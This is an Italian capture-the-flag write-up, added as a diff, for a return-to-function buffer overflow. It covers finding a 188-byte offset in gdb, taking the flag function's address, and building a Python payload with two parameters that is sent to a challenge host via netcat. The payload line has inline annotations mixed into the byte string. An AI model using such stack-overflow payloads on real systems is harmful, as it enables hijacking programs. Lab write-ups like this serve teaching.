@@ -1,0 +1,44 @@
+Il file vuln è stato analizzato tramite Ghidra.
+Possiamo vedere che ci sono diverse funzioni, principalmente main e flag
+Inserendo tanti caratteri nell'input si puo' vedere che il buffer va in overflow, segmentation fault
+
+Dobbiamo quindi ora guardare lo stato dei register per trovare quello giusto
+Utiliziammo gdp con il flag -q vuln
+`gdp -q vuln`
+`start`
+
+Il programma si ferma al breakpoint 
+
+Apro la funzione flag e vedo che ci sono due parametri. È importante ricordarlo
+Nel payload dovrò quindi inserire due parametri e non uno
+Gli indirizzi di param_1 e param_2 li vedo da ghidra
+
+Creo in gdb un pattern di 200 characters
+`pattern_create 200 bof.txt`
+
+in gdb
+`r < bof.txt`
+Ancora segmentation fault come volevamo
+
+Dobbiamo trovare l'offset, lo posso fare semplicemente tramite
+`pattern_offset EIP-Address`
+Troviamo che è uguale a 188, vuol dire che dopo 188 char possiamo inserire quello che vogliamo per controllare l'indirizzo di ritorno
+
+Ci serve l'indirizzo di inizio della funziona flag visto che vogliamo appunto la flag
+in gdp
+`disas flag`
+E prendo il primo indirizzo.
+Questo sarà l'indirizzo da inserire nel payload
+
+Creo il payload con python
+`python3 -c "import sys; sys.stdout.buffer.write(b'A'*188###188_char_come_detto_prima###+b'\xe2\x91\x04\x08'###INDIRIZZO_flag_reversed_2a2, devo aggiungere i due parametri###+b'test\xef\xbe\xad\###APPENA FINISCE L'INDIRIZZO DEL param_1 POSSO AGGIUNGERE IL 2###\xde\x0d\xd0\xde\xc0')" > payload.txt`
+
+Se tutto è giusto posso mandarlo al programma
+`cat payload.txt | ./vuln`
+
+Per ottenere la flag in questo caso devo farlo tramite un host specifico quindi
+`cat payload.txt | nc IP Port`
+
+
+
+
